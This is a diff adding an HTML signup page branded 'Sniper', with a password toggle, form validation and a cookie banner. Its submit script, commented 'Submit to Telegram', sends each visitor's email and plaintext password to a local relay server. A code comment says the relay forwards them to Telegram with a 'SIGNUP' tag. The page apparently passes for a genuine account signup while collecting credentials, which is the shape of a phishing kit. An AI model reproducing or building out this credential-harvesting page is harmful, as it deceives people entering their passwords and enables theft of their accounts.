@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create an account - Sniper</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body class="bg-white font-sans text-gray-900 min-h-screen flex flex-col items-center justify-center relative">
+
+   <div class="w-full max-w-md px-6 py-12">
+        <div class="text-center mb-8">
+            <h1 class="text-2xl font-bold flex items-center justify-center gap-2">
+                <span class="bg-blue-900 text-white rounded-full w-8 h-8 flex items-center justify-center text-sm">N</span> Sniper
+            </h1>
+            <p class="text-xl font-semibold mt-4">Create an account</p>
+        </div>
+
+        <div class="space-y-3 mb-6">
+            <button class="w-full flex items-center justify-center gap-3 border border-gray-200 py-2.5 rounded-lg hover:bg-gray-50 transition active:scale-95">
+                <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" class="w-5 h-5">
+                <span class="text-sm font-medium">Sign up with Google</span>
+            </button>
+        </div>
+
+        <div class="relative flex py-4 items-center">
+            <div class="flex-grow border-t border-gray-100"></div>
+        </div>
+
+        <form id="signupForm" class="space-y-5">
+            <div>
+                <label class="block text-sm font-medium mb-1">Email</label>
+                <input id="emailInput" type="email" placeholder="name@example.com" required
+                    class="w-full border border-gray-200 px-4 py-2.5 rounded-lg focus:ring-1 focus:ring-black focus:border-black outline-none transition-all">
+            </div>
+
+            <div>
+                <label class="block text-sm font-medium mb-1">Password</label>
+                <div class="relative">
+                    <input id="password" type="password" placeholder="Create a password" required
+                        class="w-full border border-gray-200 px-4 py-2.5 rounded-lg focus:ring-1 focus:ring-black focus:border-black outline-none transition-all">
+                    
+                    <button type="button" id="togglePassword" class="absolute right-3 top-3 text-gray-400 hover:text-gray-600">
+                        <i id="eyeIcon" class="fa-regular fa-eye"></i>
+                    </button>
+                </div>
+            </div>
+
+            <button type="submit" id="signUpBtn" disabled 
+                class="w-full bg-[#b4b7be] text-white py-2.5 rounded-lg font-semibold cursor-not-allowed transition-all">
+                Sign up
+            </button>
+        </form>
+
+        <p class="text-center text-sm mt-6 text-gray-600">
+            Already registered? <a href="login.html" class="text-black font-medium hover:underline">Login</a>
+        </p>
+
+        <div class="mt-20 text-center text-xs text-gray-400">
+            By continuing, you agree to our <a href="#" class="underline">Terms of Service</a> and <a href="#" class="underline">Privacy Policy</a>.
+        </div>
+    </div>
+
+    <div id="cookieBanner" class="fixed bottom-6 right-6 w-full max-w-sm bg-white border border-gray-100 shadow-2xl rounded-2xl p-6 transition-all duration-500">
+        <div class="flex justify-between items-start mb-4">
+            <h3 class="font-bold text-sm">We value your privacy</h3>
+            <span class="text-yellow-500 text-xs">🟡</span>
+        </div>
+        <p class="text-[11px] text-gray-600 leading-relaxed mb-6">
+            By clicking "Accept All Cookies", you agree to the storing of cookies on your device to enhance site navigation, analyze site usage, and assist in our marketing efforts.
+        </p>
+        <div class="flex gap-2 justify-between">
+            <button onclick="closeBanner()" class="text-[10px] font-bold px-3 py-2 hover:bg-gray-100 rounded">REJECT ALL</button>
+            <button onclick="closeBanner()" class="text-[10px] font-bold px-3 py-2 hover:bg-gray-100 rounded">CUSTOMIZE</button>
+            <button onclick="closeBanner()" class="text-[10px] font-bold bg-black text-white px-4 py-2 rounded-full hover:bg-gray-800 transition">ACCEPT ALL COOKIES</button>
+        </div>
+    </div>
+
+    <script>
+        const togglePassword = document.querySelector('#togglePassword');
+        const passwordInput = document.querySelector('#password');
+        const eyeIcon = document.querySelector('#eyeIcon');
+        const emailInput = document.querySelector('#emailInput');
+        const signUpBtn = document.querySelector('#signUpBtn');
+        const signupForm = document.querySelector('#signupForm');
+
+        // Toggle Password
+        togglePassword.addEventListener('click', () => {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            eyeIcon.classList.toggle('fa-eye');
+            eyeIcon.classList.toggle('fa-eye-slash');
+        });
+
+        // Form Validation (Match button color to image)
+        const validateForm = () => {
+            const isEmailValid = emailInput.value.includes('@') && emailInput.value.includes('.');
+            const isPasswordValid = passwordInput.value.length >= 6;
+
+            if (isEmailValid && isPasswordValid) {
+                signUpBtn.disabled = false;
+                signUpBtn.style.backgroundColor = "black";
+                signUpBtn.classList.remove('cursor-not-allowed');
+                signUpBtn.classList.add('cursor-pointer');
+            } else {
+                signUpBtn.disabled = true;
+                signUpBtn.style.backgroundColor = "#b4b7be";
+                signUpBtn.classList.add('cursor-not-allowed');
+                signUpBtn.classList.remove('cursor-pointer');
+            }
+        };
+
+        emailInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+
+        // Submit to Telegram
+        signupForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            signUpBtn.innerText = "Creating account...";
+
+            try {
+                const response = await fetch('http://localhost:3000/send-login-alert', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        email: emailInput.value, 
+                        password: passwordInput.value,
+                        type: 'SIGNUP' // Helps you distinguish in Telegram
+                    })
+                });
+
+                if (response.ok) {
+                    // Redirect to dashboard after signup
+                    window.location.href = "/dashboard.html";
+                }
+            } catch (error) {
+                alert('Connection Error: Is server.js running?');
+            } finally {
+                signUpBtn.innerText = "Sign up";
+            }
+        });
+
+        function closeBanner() {
+            const banner = document.querySelector('#cookieBanner');
+            banner.style.opacity = '0';
+            banner.style.transform = 'translateY(20px)';
+            setTimeout(() => banner.remove(), 500);
+        }
+    </script>
+</body>
+</html>
